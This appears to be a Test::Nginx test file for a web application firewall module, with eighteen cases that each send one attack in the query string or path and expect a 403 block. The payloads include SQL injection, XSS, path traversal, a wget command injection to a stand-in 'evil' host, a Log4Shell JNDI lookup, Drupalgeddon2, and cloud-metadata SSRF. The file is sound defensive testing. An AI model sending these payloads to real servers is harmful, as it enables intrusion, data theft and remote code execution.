# One true-positive per category that is exercisable through the request URI /
# query string. Header-only and body-only categories are covered in 03/04.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: sqli
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20union%20select%20password%20from%20users
--- error_code: 403

=== TEST 2: xss
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=%3Cscript%3Ealert(1)%3C/script%3E
--- error_code: 403

=== TEST 3: path traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=../../../../etc/passwd
--- error_code: 403

=== TEST 4: overlong UTF-8 traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?p=%c0%af%c0%af
--- error_code: 403

=== TEST 5: command injection
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=127.0.0.1;wget%20http://evil/x
--- error_code: 403

=== TEST 6: LFI/RFI wrapper
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?page=php://filter/read=convert.base64-encode/resource=index
--- error_code: 403

=== TEST 7: CRLF injection
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?next=%0d%0aSet-Cookie:%20evil=1
--- error_code: 403

=== TEST 8: null byte
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=image.php%00.png
--- error_code: 403

=== TEST 9: template / JNDI (Log4Shell)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%24%7Bjndi:ldap://evil/a%7D
--- error_code: 403

=== TEST 10: PHP RCE chain (PHPUnit eval-stdin)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
--- error_code: 403

=== TEST 11: Struts OGNL in query
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%25%7B(%23a)%7D
--- error_code: 403

=== TEST 12: Java runtime eval
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=java.lang.Runtime
--- error_code: 403

=== TEST 13: Rails YAML deserialization
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=!ruby/object:Gem::Requirement
--- error_code: 403

=== TEST 14: Drupalgeddon2
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?name%5B%23post_render%5D%5B%5D=passthru&name%5B%23markup%5D=id
--- error_code: 403

=== TEST 15: vBulletin RCE
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?widgetConfig[code]=echo
--- error_code: 403

=== TEST 16: sensitive file probe (.env)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/.env
--- error_code: 403

=== TEST 17: webshell probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/c99.php
--- error_code: 403

=== TEST 18: cloud metadata SSRF
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169.254.169.254/latest/meta-data/
--- error_code: 403
